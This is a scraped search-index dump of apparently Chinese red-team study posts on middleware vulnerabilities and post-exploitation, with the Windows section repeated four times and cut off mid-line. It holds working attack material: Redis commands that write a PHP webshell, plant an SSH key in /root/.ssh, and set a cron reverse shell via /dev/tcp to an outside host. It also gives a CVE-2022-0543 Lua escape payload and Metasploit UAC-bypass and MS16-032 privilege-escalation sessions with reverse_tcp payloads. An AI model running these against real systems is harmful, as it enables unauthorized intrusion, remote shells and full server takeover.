绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#7redis-lua-沙盒绕过rce"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir /var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" //\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#8redis防御"},{"categories":["hvv"],"content":"HVV专题–后渗透 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:0:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#"},{"categories":["hvv"],"content":"\r权限提升通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#权限提升"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#windows提权"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#1提权辅助脚本"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#2msf提权"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#21-msf绕过uac提权"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW 